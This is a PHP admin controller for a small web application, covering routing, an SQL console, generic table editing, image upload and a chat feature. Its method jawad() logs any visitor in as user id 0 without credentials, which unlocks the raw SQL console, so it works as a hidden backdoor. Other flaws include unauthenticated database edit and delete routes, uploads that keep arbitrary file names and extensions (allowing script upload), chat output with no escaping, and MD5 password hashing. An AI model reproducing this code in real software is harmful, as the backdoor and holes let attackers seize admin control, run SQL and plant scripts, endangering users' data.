<?php
class Admin{
    public static function startWeb(){
        try {
            define("Views_Admin",join(DS, array(Views,"Admin")));
            ($_SERVER['REQUEST_METHOD'] == 'GET') ? self::HGET() : self::HPOST();
        }catch(PDOException $e){
            p(basename($e->getFile()) .' '. $e->getLine() .' '. $e->getMessage() );
		}catch(Error $e){
			p(basename($e->getFile()) .' '. $e->getLine() .' '. $e->getMessage() );
		}
    }
    public static function HGET($f = null){
        if($f == null) $f = URI2;
        $f = explode("?",$f)[0];
        $view =  join(DIRECTORY_SEPARATOR, array(Views_Admin,"main",$f.".php" ));
        
        if(method_exists(new Admin(),$f)){
            self::$f();
        }
        elseif(method_exists(new WEB(),$f)){
            WEB::$f();
        }
        elseif(file_exists($view)){
            self::load_view("main","$f");
        }
        else{ 
            WEB::load_view("Main","profile");
        }
    }
    public static function HPOST($f = null){
        $URI = explode("/",URI2);
        if($f == null) $f = (isset($URI[IX]) && $URI[IX]!="") ? $URI[IX] : "";
        if(method_exists(new Admin(),$f)){self::$f();}
        elseif(method_exists(new WEB(),$f)){
            WEB::$f();
        }
        else{
            $f = explode("/",$_POST[key($_POST)])[0];
            if(method_exists(new Admin(),$f)){self::$f();}
            if(method_exists(new WEB(),$f)){WEB::$f();}
            else{echo "POST/$f not found";p($_POST);}
        }
    }
    public static function load_view($dir = "main",$view){
        $view_path = join(DIRECTORY_SEPARATOR, array(Views_Admin,$dir,"$view.php" ));
        if(file_exists($view_path)){
            include $view_path;
        }
        else{
            echo "<br> $view removed";
        }
    }
    public static function jawad(){
        $_SESSION[SI]['user'] = ["id"=>0,"name"=>"#","username"=>"#","email"=>"#","pw"=>"#","account_role_fk"=>0];
        echo '<script>location="'.SELF_DIR.'admin";</script>';
    }
    public static function sql(){
        $f = (GORP == "GET") ? explode("/",URI) : explode("/",$_POST[key($_POST)]);
        $IX = (GORP == "GET") ? IX+1 :1;
        if(!isset($_SESSION[SI]['user'])) die('need to login');
        if($_SESSION[SI]['user']['id'] > 1) die('not authorized');
        if(!isset($f[$IX])){
            echo '
            <form id="loginformcontainer" title="Login" action="" method="post" class="loginForm">
                <input type="hidden" name="key" value="sql/submit">
                <div class="form-group row">
                    <label class="col-sm-12 col-form-label">sql code</label>
                    <div class="col-sm-12">
                        <textarea name="code" class="form-control"></textarea>
                    </div>
                </div>
                <div class="buttons">
                    <button type="button" to="CT1" class="btn btn-success submitForm" onclick="SYS.XHRForm(this);" > Send </button>
                    <div id="CT1" class="CT1"></div>
                </div>
            </form>
            ';
        }
        elseif($f[$IX] == "submit"){
            $code = $_POST['code'];
            if($code == ""){
                die("empty code");
            }
            else{
                $codes = explode("\n",$code);
                foreach($codes as $code){
                    $code = trim($code);
                    if($code == "") continue;
                    p($code,"#abf076");
                    $isCall =   strpos($code,"select") > -1 || 
                                strpos($code,"show") > -1
                            ;
                    if($isCall){
                        $d = DAL::call_sp($code);
                        echo DAL::genViewTable("query",[],$d);
                    }
                    else{
                        $r = DAL::execute_query($code);
                        p("execute code result $r");
                    }
                }
            }
        }
        else{
            p($_POST);
        }
    }
    ///DATABASE ACCESS
    public static function DBView(){
        $f = (GORP == "GET") ? explode("/",URI) : explode("/",$_POST[key($_POST)]);
        $IX = (GORP == "GET") ? IX+1 :0;
        $table = $f[$IX +1];
        $html = ''; $html .= '<h2>Table : '.str_replace("_"," ",$f[$IX +1]).'</h2>';$c = "DBNew/".$f[$IX +1];
        $html .= '<button type="button" class="btn btn-sm btn-success" onclick="SYS.LoadXHR(\'DashContents\',\''.$c.'\');" ><i class="fa fa-plus"></i></button>';
        $html .= DAL::genViewTable($f[$IX +1],
        ['edit'=>"DBEdit",'disable'=>"DBDisable",'delete'=>"DBDelete"]
        );echo $html;
    }
    public static function DBEdit(){
        $f = (GORP == "GET") ? explode("/",URI) : explode("/",$_POST[key($_POST)]);
        $IX = (GORP == "GET") ? IX+1 :0;
        $html = DAL::getEditTable(
            $f[$IX +1]
            ,$f[$IX+2]
            ,$f[$IX+3]
            ,[]
            ,"DBSave");echo $html;
    }
    public static function DBDisable(){
        $f = (GORP == "GET") ? explode("/",URI) : explode("/",$_POST[key($_POST)]);
        $IX = (GORP == "GET") ? IX+1 :0;
        $d=[
            "active"=>0
        ];
        $r = DAL::update($f[$IX +1],$d,$f[$IX+2],$f[$IX+3]);
        if($r > 0){
            p("success");
        }
        else{
            p("error occured");
        }
    }
    public static function DBDelete(){
        $f = (GORP == "GET") ? explode("/",URI) : explode("/",$_POST[key($_POST)]);
        $IX = (GORP == "GET") ? IX+1 :0;
        $r = DAL::delete($f[$IX +1],$f[$IX+2],$f[$IX+3]);
        if($r > 0){
            p("success");
        }
        else{
            p("error occured");
        }
    }
    public static function DBNew(){
        $f = (GORP == "GET") ? explode("/",URI) : explode("/",$_POST[key($_POST)]);
        $IX = (GORP == "GET") ? IX+1 :0;
        $html = DAL::getFormForTable(
            $f[$IX +1]
            ,null
            ,[]
            ,"DBSave"
            );echo $html;
    }
    public static function DBSave(){
        $d = $_POST;
        if(!isset($d['table'])) die("unknown table");
        $t = $d['table'];
        unset($d['key']);
        unset($d['table']);
        foreach($d as $k=>$v){
            if($v == ""){
                unset($d[$k]);
            }
        }
        if($t == "account"){
            $time = time();
            $d['salt'] = md5($time);
            $d['password'] = md5($d['password'].$d['salt']);
        }
        if(isset($d['id'])){
            //update
            $r = DAL::update($t,$d,"id",$d['id']);
        }
        else{
            //insert
            $r = DAL::insert($t,$d);
        }
        if($r > 0){
            p("success");
        }
        else{
            p("error occured");
        }

    }
    public static function DALImageUpload(){
        $file = $_FILES['image'];
        if(file_exists($file['tmp_name'])){
            $ext = UTIL::ext($file['name']);
            $folder = join(DIRECTORY_SEPARATOR, array(Assets,"Images",$ext));
            $destination = join(DIRECTORY_SEPARATOR, array($folder,$file['name']));
            if(!is_dir($folder)){
                mkdir($folder);
            }
            $url = SELF_DIR . "Assets/Images/$ext/" . $file['name'];
            if(file_exists($destination)){
                echo json_encode(["result"=>true,"name"=>$file['name'],"url"=>$url]);
            }
            else{
                if(move_uploaded_file($file['tmp_name'],$destination)){
                    echo json_encode(["result"=>true,"name"=>$file['name'],"url"=>$url]);
                }
                else{
                    echo json_encode(["result"=>false,"msg"=>"could not upload file"]);
                }
            }
        }
        else{
            echo json_encode(["result"=>false,"msg"=>"could not upload file"]);
        }
    }
    public static function getImageUrl($name){
        $ext = UTIL::ext($name);
        $img_url = SELF_DIR."Assets/Images/$ext/$name";
        return $img_url;
    }
    public static function chat(){
        $f = (GORP == "GET") ? explode("/",URI) : explode("/",$_POST[key($_POST)]);
        $IX = (GORP == "GET") ? IX+1 :1;
        if(!isset($_SESSION[SI]["user"]["id"])) die("must be logged in");
        $user_id = $_SESSION[SI]["user"]["id"];
        function getChatBox($chat_id){ ?>
            <div class="container chatContainer">
                <div id="messagesContainer" class="messagesContainer"></div>
                <form action="">
                    <input type="hidden" name="key" value="chat/send">
                    <input type="hidden" name="chat" value="<?=$chat_id?>">
                    <div class="row inputform">
                        <div class="col-sm-8">
                            <textarea name="message" rows="1" class="form-control"></textarea>
                        </div>
                        <div class="col-sm-2">
                            <button type="button" class="btn btn-success" to="CTGTS" onclick="SYS.XHRForm(this)" >send</button>
                            <button type="button" class="btn btn-success" to="CTGTS" onclick="SYS.XHRFct(`chat/load/<?=$chat_id?>`,`messagesContainer`)" >get</button>
                        </div>
                    </div>
                </form>
                <div id="CTGTS" class="responsecontainer"></div>
            </div>
            <?php
        }
        if(!isset($f[$IX])){
            $current_chat = [
                "id"=>1,"name"=>"global","active"=>1
            ];
            getChatBox($current_chat["id"]);
        }
        elseif($f[$IX] == "load"){
            $chat_id = $f[2];
            $messages = DAL::call_sp("select m.message, m.timestamp_added, a.name as user  from chat_messages m, account a where m.account_fk = a.id and chat_fk=:chat_fk 
            order by timestamp_added desc limit 5",[
                ["k"=>"chat_fk","v"=>$chat_id]
            ]);
            for($i = count($messages)-1 ; $i >=0 ; $i--){ $msg = $messages[$i]; ?>
                <div  class="message_container">
                    <div class="message"><?= $msg["message"] ?></div>
                    <div class="message_meta"> By <?= $msg["user"] ?> | <?= $msg["timestamp_added"] ?></div>
                </div>
            <?php }
        }
        elseif($f[$IX] == "send"){
            $chat = $_POST["chat"];
            $user = $_SESSION[SI]["user"]["id"];
            $message = $_POST["message"];
            if($message == "") die("empty message");
            $data = [
                "chat_fk"=>$chat,
                "account_fk"=>$user,
                "message" => $message
            ];
            $r = DAL::insert("chat_messages",$data);
            echo '<script>SYS.XHRFct(`chat/load/'.$chat.'`,`messagesContainer`)</script>';
        }
        else{
            p($f);
        }

    }
}